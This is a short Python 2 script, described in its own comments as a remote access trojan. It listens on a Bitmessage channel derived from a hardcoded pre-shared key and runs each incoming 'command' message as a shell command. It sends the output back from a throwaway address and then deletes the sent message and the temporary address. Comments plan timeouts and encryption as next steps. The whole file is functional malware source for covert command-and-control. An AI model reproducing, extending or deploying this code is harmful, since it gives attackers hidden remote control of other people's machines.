#! /bin/python2
#Any way we can make the interpreter dynamic so people still running python2 can use it out of the box?
#Neat little idea for a RAT, reads from a chan generated by a pre shared key, waits for someone to
#message the chan and interprets the message as a shell command and runs it,
#then sends the result of the command from a throwaway temp address back to the chan
#possible next steps, private chan based on some function of pre shared key, probably be nice
#to encrypt the messages, but most immediate need is to impose a timeout on the command
#so that stuff like ping 8.8.8.8 doesn't just run forever and instead prints what it has so far and that it timed out
#then parse for a comment after the command so the user can specify a different timeout value
import xmlrpclib
import json
import time
import base64
import subprocess
import os

#TODO check and see if bm is already running with api enabled
#if not handle it

api = xmlrpclib.ServerProxy("http://bitmessage:security@localhost:8442/")

#hardcoded for now, probably ought to read from a config file or something but meh
psk = 'defaultvalue'
channel = api.createChan(base64.b64encode(psk))
if channel == 'API Error 0024: Chan address is already present.':
	for i in json.loads(api.listAddresses2())['addresses']:
		if base64.b64decode(i['label']) == "[chan] "+psk:
			channel = i['address']

while True:
	for i in json.loads(api.getAllInboxMessages())['inboxMessages']:
		if i['toAddress'] == channel and base64.b64decode(i['subject']) == 'command':
			print 'We see the message', base64.b64decode(i['message'])
			if i['read'] == 0:
				p1 = subprocess.Popen('sh -s' ,stdin=subprocess.PIPE , stdout=subprocess.PIPE, shell=True)
				retval = p1.communicate(base64.b64decode(i['message']))
				print retval
				
				newAddress = api.createRandomAddress(base64.b64encode("temporary"))
	
				print "sending return value from",newAddress
				ack = api.sendMessage(channel, newAddress, base64.b64encode("return value"), base64.b64encode(str(retval)))

				while ((api.getStatus(ack) != "ackreceived") and (api.getStatus(ack) != "msgsentnoackexpected")):
					time.sleep(100)#this can take a while and is super ugly
				# I haven't looked at the api lately but I don't think there are any nice ways to wait
				#so probably keep it like this for a little bit

				api.trashSentMessageByAckData(ack)
				api.deleteAddress(newAddress)
				api.getInboxMessageByID(i["msgid"], True)
			
			else:
				print "but it is has already been read"
